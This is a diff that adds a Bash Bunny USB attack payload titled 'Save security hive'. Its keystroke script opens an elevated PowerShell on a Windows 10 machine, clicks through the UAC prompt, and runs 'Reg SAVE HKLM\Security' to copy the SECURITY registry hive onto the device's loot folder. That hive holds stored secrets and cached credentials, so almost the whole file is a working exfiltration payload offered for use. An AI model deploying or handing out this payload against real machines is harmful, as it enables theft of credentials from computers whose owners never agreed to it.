@@ -1,0 +1,22 @@
+# Title:       	Save security hive
+# Description:  Uses PowerShell, to run Reg.exe to save security hive to the bunny.  
+# Author:       Cribbit
+# Version:      1.0
+# Category:     Exfiltration
+# Target:       Windows 10 Creators Update (Powershell)
+# Attackmodes:  HID & STORAGE
+# Props:        Ben Clark (RTFM)	
+
+LED SETUP
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+Q DELAY 200
+Q GUI x
+Q STRING a
+sleep 2
+Q ALT y
+sleep 2
+Q STRING "Reg SAVE HKLM\Security ((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\\'+\$env:computername+'_security.hive') /y"
+Q ENTER 
+LED FINISH
